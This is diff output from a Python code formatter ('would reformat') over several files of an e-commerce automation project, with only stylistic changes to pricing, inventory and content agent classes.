--- /home/brend/Flipsync_Final/fs_agt_clean/agents/automation/__init__.py	2025-06-16 06:34:12.250998+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/automation/__init__.py	2025-06-19 04:03:35.108327+00:00
@@ -1,24 +1,28 @@
 """
 FlipSync Automation Agents Package
 
 This package contains automated agents that handle routine tasks and optimizations:
 - AutoPricingAgent: Automated pricing decisions and adjustments
-- AutoListingAgent: Automated listing creation and optimization  
+- AutoListingAgent: Automated listing creation and optimization
 - AutoInventoryAgent: Automated inventory management and purchasing
 """
 
 from .auto_pricing_agent import AutoPricingAgent, PricingStrategy, PricingDecision
 from .auto_listing_agent import AutoListingAgent, ListingPlatform, AutoListingResult
-from .auto_inventory_agent import AutoInventoryAgent, InventoryAction, PurchaseRecommendation
+from .auto_inventory_agent import (
+    AutoInventoryAgent,
+    InventoryAction,
+    PurchaseRecommendation,
+)
 
 __all__ = [
     "AutoPricingAgent",
-    "AutoListingAgent", 
+    "AutoListingAgent",
     "AutoInventoryAgent",
     "PricingStrategy",
     "PricingDecision",
     "ListingPlatform",
     "AutoListingResult",
     "InventoryAction",
-    "PurchaseRecommendation"
+    "PurchaseRecommendation",
 ]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/automation/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/base/test_base.py	2025-06-14 20:35:30.759670+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/base/test_base.py	2025-06-19 04:03:35.268947+00:00
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from base import *
+
 
 class TestBaseAgent:
     """Agent test class for base."""
 
     def test_import(self):
@@ -58,7 +59,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/base/test_base.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/content/compat.py	2025-06-14 20:35:30.759670+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/content/compat.py	2025-06-19 04:03:35.479497+00:00
@@ -1,10 +1,12 @@
 """Compatibility module for content agent service."""
 
 from fs_agt_clean.core.config import get_settings
 from fs_agt_clean.core.monitoring.log_manager import LogManager
-from fs_agt_clean.services.agents.content.content_agent_service import ContentAgentService
+from fs_agt_clean.services.agents.content.content_agent_service import (
+    ContentAgentService,
+)
 from fs_agt_clean.services.llm.ollama_service import OllamaLLMService
 
 
 async def get_content_agent_service() -> ContentAgentService:
     """Get the content agent service instance.
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/content/compat.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/content/__init__.py	2025-06-14 20:35:30.759670+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/content/__init__.py	2025-06-19 04:03:35.758929+00:00
@@ -39,46 +39,53 @@
         self.config_manager = config_manager
         self.log_manager = log_manager
         self.llm_service = llm_service
 
         # Initialize content agent service
-        self.content_agent = ContentAgentService(
-            config=config_manager,
-            log_manager=log_manager,
-            llm_service=llm_service
-        ) if ContentAgentService and config_manager and log_manager else None
+        self.content_agent = (
+            ContentAgentService(
+                config=config_manager, log_manager=log_manager, llm_service=llm_service
+            )
+            if ContentAgentService and config_manager and log_manager
+            else None
+        )
 
     async def generate_marketplace_content(
-        self,
-        product_data: Dict,
-        marketplace: str,
-        content_format: str = "standard"
+        self, product_data: Dict, marketplace: str, content_format: str = "standard"
     ) -> Dict:
         """Generate content optimized for specific marketplace."""
         try:
             if not self.content_agent:
                 return {"error": "Content agent not available"}
 
             # For now, return a simplified response since we may not have all models
             return {
                 "title": f"{product_data.get('brand', 'Brand')} {product_data.get('name', 'Product')}",
                 "description": f"High-quality {product_data.get('name', 'product')} from {product_data.get('brand', 'Brand')}",
-                "bullet_points": ["Premium quality", "Professional grade", "Satisfaction guaranteed"],
-                "keywords": [product_data.get('name', 'product').lower(), "premium", "professional"],
+                "bullet_points": [
+                    "Premium quality",
+                    "Professional grade",
+                    "Satisfaction guaranteed",
+                ],
+                "keywords": [
+                    product_data.get("name", "product").lower(),
+                    "premium",
+                    "professional",
+                ],
                 "seo_score": 85,
-                "marketplace": marketplace
+                "marketplace": marketplace,
             }
 
         except Exception as e:
             logger.error("Failed to generate marketplace content: %s", str(e))
             return {"error": str(e)}
 
     async def optimize_existing_content(
         self,
         content: Dict,
         marketplace: str,
-        optimization_goals: Optional[List[str]] = None
+        optimization_goals: Optional[List[str]] = None,
     ) -> Dict:
         """Optimize existing content for better performance."""
         try:
             if not self.content_agent:
                 return {"error": "Content agent not available"}
@@ -86,17 +93,22 @@
             # For now, return a simplified optimization response
             return {
                 "original_content": content,
                 "optimized_content": {
                     "title": content.get("title", "") + " - Premium Quality",
-                    "description": content.get("description", "") + " Backed by satisfaction guarantee.",
-                    "bullet_points": content.get("bullet_points", []) + ["Enhanced features"]
+                    "description": content.get("description", "")
+                    + " Backed by satisfaction guarantee.",
+                    "bullet_points": content.get("bullet_points", [])
+                    + ["Enhanced features"],
                 },
-                "improvements": ["Added premium positioning", "Enhanced value proposition"],
+                "improvements": [
+                    "Added premium positioning",
+                    "Enhanced value proposition",
+                ],
                 "seo_score_before": 75,
                 "seo_score_after": 90,
-                "marketplace": marketplace
+                "marketplace": marketplace,
             }
 
         except Exception as e:
             logger.error("Failed to optimize content: %s", str(e))
             return {"error": str(e)}
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/content/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/content/base_content_agent.py	2025-06-14 20:35:30.759670+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/content/base_content_agent.py	2025-06-19 04:03:36.010767+00:00
@@ -129,13 +129,15 @@
 
             # Basic content analysis
             analysis = {
                 "word_count": len(content.split()),
                 "character_count": len(content),
-                "sentence_count": len([s for s in content.split('.') if s.strip()]),
+                "sentence_count": len([s for s in content.split(".") if s.strip()]),
                 "readability_score": self._calculate_readability_score(content),
-                "seo_score": self._calculate_seo_score(content, task.get("keywords", [])),
+                "seo_score": self._calculate_seo_score(
+                    content, task.get("keywords", [])
+                ),
                 "quality_score": self._calculate_quality_score(content),
                 "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
             return {"analysis": analysis, "success": True}
@@ -145,90 +147,90 @@
             return {"error": str(e), "success": False}
 
     def _calculate_readability_score(self, content: str) -> float:
         """Calculate readability score (simplified Flesch Reading Ease)."""
         try:
-            sentences = [s for s in content.split('.') if s.strip()]
+            sentences = [s for s in content.split(".") if s.strip()]
             words = content.split()
-            
+
             if not sentences or not words:
                 return 0.0
-                
+
             avg_sentence_length = len(words) / len(sentences)
-            
+
             # Simplified readability calculation
             # Higher score = more readable
             score = 206.835 - (1.015 * avg_sentence_length)
             return max(0.0, min(100.0, score))
-            
+
         except Exception:
             return 50.0  # Default moderate readability
 
     def _calculate_seo_score(self, content: str, keywords: List[str]) -> float:
         """Calculate SEO score based on keyword usage and content structure."""
         try:
             if not keywords:
                 return 50.0  # Default score if no keywords provided
-                
+
             content_lower = content.lower()
             score = 0.0
-            
+
             # Check keyword presence
             for keyword in keywords:
                 if keyword.lower() in content_lower:
                     score += 20.0
-                    
+
             # Check content length (optimal 300-600 words)
             word_count = len(content.split())
             if 300 <= word_count <= 600:
                 score += 20.0
             elif word_count > 100:
                 score += 10.0
-                
+
             # Check for headings (simple heuristic)
-            if any(line.strip().isupper() for line in content.split('\n')):
+            if any(line.strip().isupper() for line in content.split("\n")):
                 score += 10.0
-                
+
             return min(100.0, score)
-            
+
         except Exception:
             return 50.0  # Default moderate SEO score
 
     def _calculate_quality_score(self, content: str) -> float:
         """Calculate overall content quality score."""
         try:
             if not content.strip():
                 return 0.0
-                
+
             score = 0.0
-            
+
             # Length score
             word_count = len(content.split())
             if word_count >= 50:
                 score += 25.0
             elif word_count >= 20:
                 score += 15.0
-                
+
             # Structure score
-            sentences = [s for s in content.split('.') if s.strip()]
+            sentences = [s for s in content.split(".") if s.strip()]
             if len(sentences) >= 3:
                 score += 25.0
             elif len(sentences) >= 1:
                 score += 15.0
-                
+
             # Variety score (different sentence lengths)
             if sentences:
                 lengths = [len(s.split()) for s in sentences]
                 if len(set(lengths)) > 1:
                     score += 25.0
-                    
+
             # Completeness score
-            if content.strip().endswith('.'):
+            if content.strip().endswith("."):
                 score += 25.0
-                
+
             return min(100.0, score)
-            
+
         except Exception:
             return 50.0  # Default moderate quality
 
     def get_metrics(self) -> Dict[str, Any]:
         """Get agent metrics."""
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/content/base_content_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/automation/auto_pricing_agent.py	2025-06-16 06:47:08.147215+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/automation/auto_pricing_agent.py	2025-06-19 04:03:36.280843+00:00
@@ -8,37 +8,43 @@
 from datetime import datetime, timezone
 from typing import Dict, List, Optional, Any
 from dataclasses import dataclass
 from enum import Enum
 
-from fs_agt_clean.agents.base_conversational_agent import BaseConversationalAgent, AgentResponse
+from fs_agt_clean.agents.base_conversational_agent import (
+    BaseConversationalAgent,
+    AgentResponse,
+)
 from fs_agt_clean.core.ai.prompt_templates import AgentRole
 
 logger = logging.getLogger(__name__)
 
 
 class PricingStrategy(str, Enum):
     """Pricing strategy types."""
+
     COMPETITIVE = "competitive"
     PREMIUM = "premium"
     PENETRATION = "penetration"
     DYNAMIC = "dynamic"
     COST_PLUS = "cost_plus"
 
 
 class PricingTrigger(str, Enum):
     """Events that trigger pricing adjustments."""
+
     COMPETITOR_CHANGE = "competitor_change"
     INVENTORY_LEVEL = "inventory_level"
     SALES_VELOCITY = "sales_velocity"
     MARKET_TREND = "market_trend"
     TIME_BASED = "time_based"
 
 
 @dataclass
 class PricingDecision:
     """Represents an automated pricing decision."""
+
     product_id: str
     current_price: float
     recommended_price: float
     strategy: PricingStrategy
     trigger: PricingTrigger
@@ -49,10 +55,11 @@
 
 
 @dataclass
 class PricingRule:
     """Pricing rule configuration."""
+
     name: str
     strategy: PricingStrategy
     min_margin: float
     max_margin: float
     competitor_threshold: float
@@ -61,229 +68,233 @@
 
 
 class AutoPricingAgent(BaseConversationalAgent):
     """
     Automated pricing agent that makes real-time pricing decisions.
-    
+
     Capabilities:
     - Monitor competitor pricing changes
     - Adjust prices based on inventory levels
     - Implement dynamic pricing strategies
     - Optimize for profit margins and sales velocity
     - Generate pricing recommendations with AI analysis
     """
-    
-    def __init__(self, agent_id: str = "auto_pricing_agent", use_fast_model: bool = True):
+
+    def __init__(
+        self, agent_id: str = "auto_pricing_agent", use_fast_model: bool = True
+    ):
         """Initialize the auto pricing agent."""
         super().__init__(
             agent_role=AgentRole.MARKET,
             agent_id=agent_id,
-            use_fast_model=use_fast_model
+            use_fast_model=use_fast_model,
         )
-        
+
         # Pricing configuration
         self.pricing_rules: List[PricingRule] = []
         self.active_decisions: Dict[str, PricingDecision] = {}
         self.monitoring_enabled = True
-        
+
         # Default pricing rules
         self._initialize_default_rules()
-        
+
         logger.info(f"AutoPricingAgent initialized: {self.agent_id}")
-    
+
     def _initialize_default_rules(self):
         """Initialize default pricing rules."""
         self.pricing_rules = [
             PricingRule(
                 name="competitive_electronics",
                 strategy=PricingStrategy.COMPETITIVE,
                 min_margin=0.15,
                 max_margin=0.35,
                 competitor_threshold=0.05,
-                inventory_threshold=10
+                inventory_threshold=10,
             ),
             PricingRule(
                 name="premium_brand",
                 strategy=PricingStrategy.PREMIUM,
                 min_margin=0.25,
                 max_margin=0.50,
                 competitor_threshold=0.10,
-                inventory_threshold=5
+                inventory_threshold=5,
             ),
             PricingRule(
                 name="clearance_inventory",
                 strategy=PricingStrategy.PENETRATION,
                 min_margin=0.05,
                 max_margin=0.20,
                 competitor_threshold=0.15,
-                inventory_threshold=50
-            )
+                inventory_threshold=50,
+            ),
         ]
-    
+
     async def _get_agent_context(self, conversation_id: str) -> Dict[str, Any]:
         """Get agent-specific context for prompt generation."""
         return {
             "agent_type": "automated_pricing_specialist",
             "capabilities": [
                 "Real-time pricing optimization",
                 "Competitor price monitoring",
                 "Dynamic pricing strategies",
                 "Profit margin optimization",
-                "Market-based adjustments"
+                "Market-based adjustments",
             ],
             "pricing_strategies": [strategy.value for strategy in PricingStrategy],
             "active_rules": len([rule for rule in self.pricing_rules if rule.enabled]),
-            "monitoring_status": "active" if self.monitoring_enabled else "paused"
+            "monitoring_status": "active" if self.monitoring_enabled else "paused",
         }
-    
+
     async def analyze_pricing_opportunity(
-        self, 
-        product_id: str, 
+        self,
+        product_id: str,
         current_price: float,
         cost: float,
-        market_data: Dict[str, Any]
+        market_data: Dict[str, Any],
     ) -> PricingDecision:
         """Analyze pricing opportunity and generate recommendation."""
         try:
             # Extract market information
             competitor_prices = market_data.get("competitor_prices", [])
             inventory_level = market_data.get("inventory_level", 0)
             sales_velocity = market_data.get("sales_velocity", 0)
-            
+
             # Determine best pricing strategy
             strategy = self._select_pricing_strategy(
                 current_price, cost, competitor_prices, inventory_level
             )
-            
+
             # Calculate recommended price
             recommended_price = self._calculate_optimal_price(
                 current_price, cost, competitor_prices, strategy, market_data
             )
-            
+
             # Determine trigger
             trigger = self._identify_pricing_trigger(market_data)
-            
+
             # Calculate confidence
             confidence = self._calculate_pricing_confidence(
                 current_price, recommended_price, competitor_prices, market_data
             )
-            
+
             # Generate AI-powered reasoning
             reasoning = await self._generate_pricing_reasoning(
                 product_id, current_price, recommended_price, strategy, market_data
             )
-            
+
             decision = PricingDecision(
                 product_id=product_id,
                 current_price=current_price,
                 recommended_price=recommended_price,
                 strategy=strategy,
                 trigger=trigger,
                 confidence=confidence,
                 reasoning=reasoning,
                 timestamp=datetime.now(timezone.utc),
-                market_data=market_data
-            )
-            
+                market_data=market_data,
+            )
+
             # Store decision
             self.active_decisions[product_id] = decision
-            
+
             return decision
-            
+
         except Exception as e:
             logger.error(f"Error analyzing pricing opportunity: {e}")
             raise
-    
+
     def _select_pricing_strategy(
-        self, 
-        current_price: float, 
-        cost: float, 
+        self,
+        current_price: float,
+        cost: float,
         competitor_prices: List[float],
-        inventory_level: int
+        inventory_level: int,
     ) -> PricingStrategy:
         """Select the best pricing strategy based on market conditions."""
         if not competitor_prices:
             return PricingStrategy.COST_PLUS
-        
+
         avg_competitor_price = sum(competitor_prices) / len(competitor_prices)
-        current_margin = (current_price - cost) / current_price if current_price > 0 else 0
-        
+        current_margin = (
+            (current_price - cost) / current_price if current_price > 0 else 0
+        )
+
         # High inventory - use penetration pricing
         if inventory_level > 50:
             return PricingStrategy.PENETRATION
-        
+
         # Low inventory and good margin - use premium pricing
         if inventory_level < 10 and current_margin > 0.3:
             return PricingStrategy.PREMIUM
-        
+
         # Price significantly above competitors - use competitive pricing
         if current_price > avg_competitor_price * 1.1:
             return PricingStrategy.COMPETITIVE
-        
+
         # Default to dynamic pricing
         return PricingStrategy.DYNAMIC
-    
+
     def _calculate_optimal_price(
         self,
         current_price: float,
         cost: float,
         competitor_prices: List[float],
         strategy: PricingStrategy,
-        market_data: Dict[str, Any]
+        market_data: Dict[str, Any],
     ) -> float:
         """Calculate optimal price based on strategy."""
         if not competitor_prices:
             return current_price * 1.05  # Small increase if no competition data
-        
+
         avg_competitor_price = sum(competitor_prices) / len(competitor_prices)
         min_competitor_price = min(competitor_prices)
         max_competitor_price = max(competitor_prices)
-        
+
         if strategy == PricingStrategy.COMPETITIVE:
             # Price slightly below average competitor
             return avg_competitor_price * 0.98
-        
+
         elif strategy == PricingStrategy.PREMIUM:
             # Price above competitors but within reason
             return min(max_competitor_price * 1.05, cost * 1.5)
-        
+
         elif strategy == PricingStrategy.PENETRATION:
             # Price below minimum competitor
             return max(min_competitor_price * 0.95, cost * 1.1)
-        
+
         elif strategy == PricingStrategy.DYNAMIC:
             # Adjust based on sales velocity and inventory
             sales_velocity = market_data.get("sales_velocity", 1.0)
             inventory_level = market_data.get("inventory_level", 10)
-            
+
             if sales_velocity > 2.0:  # High sales
                 return min(current_price * 1.03, avg_competitor_price)
             elif sales_velocity < 0.5:  # Low sales
                 return max(current_price * 0.97, cost * 1.15)
             else:
                 return avg_competitor_price * 0.99
-        
+
         else:  # COST_PLUS
             return cost * 1.25
-    
+
     def _identify_pricing_trigger(self, market_data: Dict[str, Any]) -> PricingTrigger:
         """Identify what triggered the pricing analysis."""
         if market_data.get("competitor_price_changed"):
             return PricingTrigger.COMPETITOR_CHANGE
         elif market_data.get("inventory_level", 0) < 5:
             return PricingTrigger.INVENTORY_LEVEL
         elif market_data.get("sales_velocity", 0) < 0.5:
             return PricingTrigger.SALES_VELOCITY
         else:
             return PricingTrigger.TIME_BASED
-    
+
     def _calculate_pricing_confidence(
         self,
         current_price: float,
         recommended_price: float,
         competitor_prices: List[float],
-        market_data: Dict[str, Any]
+        market_data: Dict[str, Any],
     ) -> float:
         """Calculate confidence in pricing recommendation."""
         confidence = 0.5  # Base confidence
 
         # More data = higher confidence
@@ -308,21 +319,21 @@
 
         return min(1.0, confidence)
 
     async def _process_response(self, response: Any) -> str:
         """Process and format the response for pricing queries."""
-        if hasattr(response, 'content'):
+        if hasattr(response, "content"):
             return response.content
         return str(response)
-    
+
     async def _generate_pricing_reasoning(
         self,
         product_id: str,
         current_price: float,
         recommended_price: float,
         strategy: PricingStrategy,
-        market_data: Dict[str, Any]
+        market_data: Dict[str, Any],
     ) -> str:
         """Generate AI-powered reasoning for pricing decision."""
         try:
             prompt = f"""
             Analyze this pricing decision and provide clear reasoning:
@@ -337,33 +348,32 @@
             - Inventory Level: {market_data.get('inventory_level', 'Unknown')}
             - Sales Velocity: {market_data.get('sales_velocity', 'Unknown')}
             
             Provide a concise explanation of why this price change is recommended.
             """
-            
+
             response = await self.llm_client.generate_response(
                 prompt=prompt,
-                system_prompt="You are an expert pricing analyst. Provide clear, data-driven reasoning for pricing decisions."
-            )
-            
+                system_prompt="You are an expert pricing analyst. Provide clear, data-driven reasoning for pricing decisions.",
+            )
+
             return response.content
-            
+
         except Exception as e:
             logger.error(f"Error generating pricing reasoning: {e}")
-            return f"Automated pricing recommendation based on {strategy.value} strategy"
+            return (
+                f"Automated pricing recommendation based on {strategy.value} strategy"
+            )
 
     async def _process_response(self, response: Any) -> str:
         """Process and format the response for pricing queries."""
-        if hasattr(response, 'content'):
+        if hasattr(response, "content"):
             return response.content
         return str(response)
 
     async def handle_message(
-        self, 
-        message: str, 
-        conversation_id: str, 
-        user_id: str
+        self, message: str, conversation_id: str, user_id: str
     ) -> AgentResponse:
         """Handle pricing-related queries and requests."""
         try:
             # Generate AI response for pricing queries
             system_prompt = """You are FlipSync's Auto Pricing Agent, an expert in automated pricing strategies and market optimization.
@@ -376,29 +386,28 @@
 - Automated pricing rules and triggers
 
 Provide specific, actionable pricing advice and explain automated pricing decisions clearly."""
 
             response = await self.llm_client.generate_response(
-                prompt=message,
-                system_prompt=system_prompt
-            )
-            
+                prompt=message, system_prompt=system_prompt
+            )
+
             return AgentResponse(
                 content=response.content,
                 agent_type="auto_pricing",
                 confidence=0.9,
                 response_time=response.response_time,
                 metadata={
                     "active_rules": len(self.pricing_rules),
                     "monitoring_enabled": self.monitoring_enabled,
-                    "active_decisions": len(self.active_decisions)
-                }
-            )
-            
+                    "active_decisions": len(self.active_decisions),
+                },
+            )
+
         except Exception as e:
             logger.error(f"Error handling message: {e}")
             return AgentResponse(
                 content="I'm having trouble processing your pricing request right now. Please try again.",
                 agent_type="auto_pricing",
                 confidence=0.1,
-                response_time=0.0
-            )
+                response_time=0.0,
+            )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/automation/auto_pricing_agent.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/automation/auto_inventory_agent.py	2025-06-16 06:47:33.117087+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/automation/auto_inventory_agent.py	2025-06-19 04:03:36.416211+00:00
@@ -8,46 +8,53 @@
 from datetime import datetime, timezone, timedelta
 from typing import Dict, List, Optional, Any
 from dataclasses import dataclass
 from enum import Enum
 
-from fs_agt_clean.agents.base_conversational_agent import BaseConversationalAgent, AgentResponse
+from fs_agt_clean.agents.base_conversational_agent import (
+    BaseConversationalAgent,
+    AgentResponse,
+)
 from fs_agt_clean.core.ai.prompt_templates import AgentRole
 
 logger = logging.getLogger(__name__)
 
 
 class InventoryAction(str, Enum):
     """Types of inventory actions."""
+
     REORDER = "reorder"
     PURCHASE = "purchase"
     LIQUIDATE = "liquidate"
     HOLD = "hold"
     MONITOR = "monitor"
 
 
 class StockLevel(str, Enum):
     """Stock level categories."""
+
     OUT_OF_STOCK = "out_of_stock"
     LOW_STOCK = "low_stock"
     OPTIMAL = "optimal"
     OVERSTOCK = "overstock"
     EXCESS = "excess"
 
 
 class PurchaseSource(str, Enum):
     """Sources for inventory purchases."""
+
     WHOLESALE = "wholesale"
     LIQUIDATION = "liquidation"
     RETAIL_ARBITRAGE = "retail_arbitrage"
     ONLINE_ARBITRAGE = "online_arbitrage"
     DIRECT_SUPPLIER = "direct_supplier"
 
 
 @dataclass
 class InventoryItem:
     """Represents an inventory item."""
+
     sku: str
     name: str
     category: str
     current_stock: int
     reorder_point: int
@@ -61,10 +68,11 @@
 
 
 @dataclass
 class PurchaseRecommendation:
     """Automated purchase recommendation."""
+
     item_sku: str
     recommended_quantity: int
     estimated_cost: float
     source: PurchaseSource
     urgency: str  # high, medium, low
@@ -76,10 +84,11 @@
 
 
 @dataclass
 class InventoryAlert:
     """Inventory alert for attention."""
+
     item_sku: str
     alert_type: str
     severity: str  # critical, warning, info
     message: str
     recommended_action: InventoryAction
@@ -87,86 +96,90 @@
 
 
 class AutoInventoryAgent(BaseConversationalAgent):
     """
     Automated inventory management agent.
-    
+
     Capabilities:
     - Automated reorder point calculations
     - Purchase opportunity identification
     - Stock level optimization
     - Demand forecasting
     - Supplier performance monitoring
     - ROI-based purchasing decisions
     """
-    
-    def __init__(self, agent_id: str = "auto_inventory_agent", use_fast_model: bool = True):
+
+    def __init__(
+        self, agent_id: str = "auto_inventory_agent", use_fast_model: bool = True
+    ):
         """Initialize the auto inventory agent."""
         super().__init__(
             agent_role=AgentRole.LOGISTICS,
             agent_id=agent_id,
-            use_fast_model=use_fast_model
+            use_fast_model=use_fast_model,
         )
-        
+
         # Inventory configuration
         self.inventory_items: Dict[str, InventoryItem] = {}
         self.purchase_recommendations: List[PurchaseRecommendation] = []
         self.inventory_alerts: List[InventoryAlert] = []
         self.auto_purchasing_enabled = False  # Safety feature
         self.monitoring_enabled = True
-        
+
         # Configuration parameters
         self.min_roi_threshold = 0.20  # 20% minimum ROI
         self.max_payback_days = 90  # Maximum payback period
         self.safety_stock_multiplier = 1.5
-        
+
         logger.info(f"AutoInventoryAgent initialized: {self.agent_id}")
-    
+
     async def _get_agent_context(self, conversation_id: str) -> Dict[str, Any]:
         """Get agent-specific context for prompt generation."""
         return {
             "agent_type": "automated_inventory_specialist",
             "capabilities": [
                 "Automated reorder management",
                 "Purchase opportunity analysis",
                 "Demand forecasting",
                 "Stock optimization",
                 "ROI-based purchasing",
-                "Supplier performance tracking"
+                "Supplier performance tracking",
             ],
             "monitored_items": len(self.inventory_items),
             "active_recommendations": len(self.purchase_recommendations),
             "pending_alerts": len(self.inventory_alerts),
-            "auto_purchasing": "enabled" if self.auto_purchasing_enabled else "disabled"
+            "auto_purchasing": (
+                "enabled" if self.auto_purchasing_enabled else "disabled"
+            ),
         }
-    
+
     async def analyze_inventory_needs(self) -> List[PurchaseRecommendation]:
         """Analyze inventory and generate purchase recommendations."""
         recommendations = []
-        
+
         for sku, item in self.inventory_items.items():
             try:
                 # Check stock level
                 stock_level = self._categorize_stock_level(item)
-                
+
                 # Calculate reorder needs
                 if stock_level in [StockLevel.OUT_OF_STOCK, StockLevel.LOW_STOCK]:
                     recommendation = await self._generate_reorder_recommendation(item)
                     if recommendation:
                         recommendations.append(recommendation)
-                
+
                 # Check for purchase opportunities
                 opportunity = await self._identify_purchase_opportunity(item)
                 if opportunity:
                     recommendations.append(opportunity)
-                    
+
             except Exception as e:
                 logger.error(f"Error analyzing inventory for {sku}: {e}")
-        
+
         self.purchase_recommendations = recommendations
         return recommendations
-    
+
     def _categorize_stock_level(self, item: InventoryItem) -> StockLevel:
         """Categorize current stock level."""
         if item.current_stock == 0:
             return StockLevel.OUT_OF_STOCK
         elif item.current_stock <= item.reorder_point:
@@ -175,126 +188,132 @@
             return StockLevel.OVERSTOCK
         elif item.current_stock > item.max_stock * 1.5:
             return StockLevel.EXCESS
         else:
             return StockLevel.OPTIMAL
-    
-    async def _generate_reorder_recommendation(self, item: InventoryItem) -> Optional[PurchaseRecommendation]:
+
+    async def _generate_reorder_recommendation(
+        self, item: InventoryItem
+    ) -> Optional[PurchaseRecommendation]:
         """Generate reorder recommendation for low stock item."""
         try:
             # Calculate optimal order quantity
             daily_sales = item.sales_velocity
             lead_time_demand = daily_sales * item.lead_time_days
             safety_stock = lead_time_demand * self.safety_stock_multiplier
-            
+
             # Economic Order Quantity (simplified)
             optimal_quantity = max(
                 int(item.max_stock - item.current_stock),
-                int(lead_time_demand + safety_stock)
-            )
-            
+                int(lead_time_demand + safety_stock),
+            )
+
             # Calculate costs and ROI
             total_cost = optimal_quantity * item.cost
             expected_revenue = optimal_quantity * item.selling_price
-            expected_roi = (expected_revenue - total_cost) / total_cost if total_cost > 0 else 0
-            
+            expected_roi = (
+                (expected_revenue - total_cost) / total_cost if total_cost > 0 else 0
+            )
+
             # Calculate payback period
             daily_profit = daily_sales * (item.selling_price - item.cost)
             payback_days = int(total_cost / daily_profit) if daily_profit > 0 else 999
-            
+
             # Generate AI reasoning
             reasoning = await self._generate_purchase_reasoning(
                 item, optimal_quantity, "reorder", expected_roi
             )
-            
+
             # Determine urgency
             urgency = "high" if item.current_stock == 0 else "medium"
-            
+
             return PurchaseRecommendation(
                 item_sku=item.sku,
                 recommended_quantity=optimal_quantity,
                 estimated_cost=total_cost,
                 source=PurchaseSource.DIRECT_SUPPLIER,
                 urgency=urgency,
                 reasoning=reasoning,
                 confidence=0.8,
                 expected_roi=expected_roi,
                 payback_period_days=payback_days,
-                timestamp=datetime.now(timezone.utc)
-            )
-            
+                timestamp=datetime.now(timezone.utc),
+            )
+
         except Exception as e:
             logger.error(f"Error generating reorder recommendation: {e}")
             return None
-    
-    async def _identify_purchase_opportunity(self, item: InventoryItem) -> Optional[PurchaseRecommendation]:
+
+    async def _identify_purchase_opportunity(
+        self, item: InventoryItem
+    ) -> Optional[PurchaseRecommendation]:
         """Identify potential purchase opportunities for profitable items."""
         try:
             # Only consider items with good sales velocity and profit margin
             if item.sales_velocity < 0.1:  # Less than 1 sale per 10 days
                 return None
-            
+
             profit_margin = (item.selling_price - item.cost) / item.selling_price
             if profit_margin < 0.15:  # Less than 15% margin
                 return None
-            
+
             # Check if we have room for more inventory
             if item.current_stock >= item.max_stock:
                 return None
-            
+
             # Calculate opportunity quantity
             opportunity_quantity = min(
                 int(item.max_stock * 0.5),  # Don't overstock
-                int(item.sales_velocity * 30)  # 30 days of sales
-            )
-            
+                int(item.sales_velocity * 30),  # 30 days of sales
+            )
+
             if opportunity_quantity < 1:
                 return None
-            
+
             # Calculate ROI
             total_cost = opportunity_quantity * item.cost
             expected_revenue = opportunity_quantity * item.selling_price
             expected_roi = (expected_revenue - total_cost) / total_cost
-            
+
             # Only recommend if ROI meets threshold
             if expected_roi < self.min_roi_threshold:
                 return None
-            
+
             # Calculate payback period
             daily_profit = item.sales_velocity * (item.selling_price - item.cost)
             payback_days = int(total_cost / daily_profit) if daily_profit > 0 else 999
-            
+
             if payback_days > self.max_payback_days:
                 return None
-            
+
             reasoning = await self._generate_purchase_reasoning(
                 item, opportunity_quantity, "opportunity", expected_roi
             )
-            
+
             return PurchaseRecommendation(
                 item_sku=item.sku,
                 recommended_quantity=opportunity_quantity,
                 estimated_cost=total_cost,
                 source=PurchaseSource.WHOLESALE,
                 urgency="low",
                 reasoning=reasoning,
                 confidence=0.7,
                 expected_roi=expected_roi,
                 payback_period_days=payback_days,
-                timestamp=datetime.now(timezone.utc)
-            )
-            
+                timestamp=datetime.now(timezone.utc),
+            )
+
         except Exception as e:
             logger.error(f"Error identifying purchase opportunity: {e}")
             return None
-    
+
     async def _generate_purchase_reasoning(
         self,
         item: InventoryItem,
         quantity: int,
         purchase_type: str,
-        expected_roi: float
+        expected_roi: float,
     ) -> str:
         """Generate AI-powered reasoning for purchase recommendation."""
         try:
             prompt = f"""
             Analyze this inventory purchase recommendation:
@@ -311,71 +330,75 @@
             - Expected ROI: {expected_roi:.1%}
             - Supplier Lead Time: {item.lead_time_days} days
             
             Provide a clear, business-focused explanation for this purchase recommendation.
             """
-            
+
             response = await self.llm_client.generate_response(
                 prompt=prompt,
-                system_prompt="You are an expert inventory analyst. Provide clear, data-driven reasoning for purchase decisions."
-            )
-            
+                system_prompt="You are an expert inventory analyst. Provide clear, data-driven reasoning for purchase decisions.",
+            )
+
             return response.content
-            
+
         except Exception as e:
             logger.error(f"Error generating purchase reasoning: {e}")
             return f"Automated {purchase_type} recommendation based on sales velocity and ROI analysis"
-    
-    async def forecast_demand(self, item_sku: str, days_ahead: int = 30) -> Dict[str, Any]:
+
+    async def forecast_demand(
+        self, item_sku: str, days_ahead: int = 30
+    ) -> Dict[str, Any]:
         """Forecast demand for an inventory item."""
         try:
             item = self.inventory_items.get(item_sku)
             if not item:
                 raise ValueError(f"Item {item_sku} not found")
-            
+
             # Simple demand forecasting (in production, would use more sophisticated models)
